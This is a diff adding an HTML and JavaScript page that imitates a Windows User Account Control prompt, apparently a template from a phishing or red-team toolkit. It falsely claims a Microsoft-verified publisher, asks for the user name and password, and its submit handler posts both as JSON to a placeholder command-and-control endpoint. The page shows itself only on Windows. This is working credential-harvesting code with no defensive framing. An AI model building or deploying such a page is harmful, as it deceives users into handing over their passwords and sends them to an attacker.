@@ -1,0 +1,239 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+
+    <style>
+        #card {
+            color: rgba(40, 40, 40, 1);
+            width: 454px;
+            border: 1px solid rgba(59, 125, 200, 1);
+            background-color: rgba(230, 230, 230, 1);
+            font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol";
+            font-weight: 500;
+            cursor: default;
+            position: absolute;
+            display: none;
+            left: 50%;
+            top: 20%;
+        }
+
+        #card-header {
+            padding: 0 25px;
+            background-color: rgba(132,184,232,1);
+        }
+
+        #card-toolbar {
+            padding-top: 11px;
+            font-size: 13px;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        #card-title {
+            margin-top: 11px;
+            font-size: 19px;
+            padding-bottom: 11px;
+        }
+
+        #card-body {
+            padding: 25px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        #card-body-app {
+            display: flex;
+            align-items: center;
+            font-size: 18px;
+            font-weight: 400;
+        }
+
+        #card-body-app > img {
+            margin-right: 8px;
+        }
+
+        #card-body-publisher {
+            margin: 20px 0;
+            font-size: 14px;
+        }
+
+        .uac-hyperlink {
+            color: rgba(77, 141, 213, 1);
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+
+        #card-body > span {
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 15px
+        }
+
+        #card-body-login {
+            display: flex;
+            flex-direction: row;
+            margin-bottom: 25px;
+        }
+
+        #card-body-login-img {
+            border-radius: 50%;
+            margin-right: 11px;
+        }
+
+        #card-body-login-fields {
+            display: flex;
+            flex-direction: column;
+            flex: 1;
+        }
+
+        #card-body-login-fields > input {
+            padding: 8px 8px 6px 8px;
+            border: 1px solid rgba(133,133,133,1);
+            flex: 1;
+            margin-right: 48px;
+        }
+
+        #card-body-login-fields > input:first-of-type {
+            margin-bottom: 11px;
+        }
+
+        #card-actions {
+            display: flex;
+            margin-top: 11px;
+        }
+
+        #card-actions > button:first-of-type {
+            margin-right: 1px;
+        }
+
+        #card-actions > button:last-of-type {
+            margin-left: 1px;
+        }
+
+        #card-actions > button {
+            flex: 1;
+            background-color: rgba(184, 184, 184, 1);
+            border: none;
+            padding: 11px 0;
+        }
+
+        #card-actions > button:focus {
+            border: 2px solid black;
+        }
+    </style>
+</head>
+<body>
+<div id="card" >
+    <div id="card-header">
+        <div id="card-toolbar">
+            <span>User Account Control</span>
+            <span onclick="closeUAC()">X</span>
+        </div>
+
+        <div id="card-title">
+            Do you want to allow this app to make changes to your device?
+        </div>
+    </div>
+
+    <div id="card-body">
+        <div id="card-body-app">
+            <img src="XX-APPLICATION-ICON-XX" width="48" height="48">
+            <span>XX-APPLICATION-NAME-XX</span>
+        </div>
+
+        <div id="card-body-publisher">
+            Verified publisher: Microsoft Windows
+        </div>
+
+        <div class="uac-hyperlink">
+            Show more details
+        </div>
+
+        <span>To continue, enter your user name and password.</span>
+
+        <div id="card-body-login">
+            <div id="card-body-login-img">
+                <img src="user.png" width="48" height="48">
+            </div>
+
+            <div id="card-body-login-fields">
+                <input type="text" id="uac-username" data-lpignore="true" placeholder="Username">
+                <input type="password" id="uac-password" data-lpignore="true" placeholder="Password">
+            </div>
+        </div>
+
+        <div class="uac-hyperlink">
+            More choices
+        </div>
+
+        <div id="card-actions">
+            <button onclick="submitUAC()">Yes</button>
+            <button onclick="closeUAC()">No</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    const access = document.getElementById("card");
+
+    function closeUAC() {
+        access.style.display = "none";
+    }
+
+    function submitUAC() {
+        const username = document.getElementById("uac-username").value;
+        const password = document.getElementById("uac-password").value;
+        fetch("XX-C2API-XX", {
+            method: "POST",
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ application: 'uac', username, password })
+        }).then(closeUAC)
+    }
+
+    function showUACPrompt() {
+        // Don't bother showing if the system isn't running Mac
+        if (navigator.platform && navigator.platform.startsWith("Win32")) {
+            access.style.display = "block";
+        }
+    }
+
+    // Drag logic
+    (() => {
+        const mouseOrigin = { x: undefined, y: undefined };
+
+        function drag(e) {
+            e.preventDefault();
+
+            let x = mouseOrigin.x - e.clientX;
+            let y = mouseOrigin.y - e.clientY;
+
+            Object.assign(mouseOrigin, { x: e.clientX, y: e.clientY });
+
+            access.style.top = (access.offsetTop - y) + 'px';
+            access.style.left = (access.offsetLeft - x) + 'px';
+        }
+
+        function stopDrag(e) {
+            document.onmouseup = null;
+            document.onmousemove = null;
+        }
+
+        document.getElementById("card-toolbar").addEventListener("mousedown", (e) => {
+            e.preventDefault();
+            Object.assign(mouseOrigin, { x: e.clientX, y: e.clientY });
+
+            document.onmouseup = stopDrag;
+            document.onmousemove = drag;
+        })
+    })()
+
+    showUACPrompt();
+</script>
+</body>
+</html>
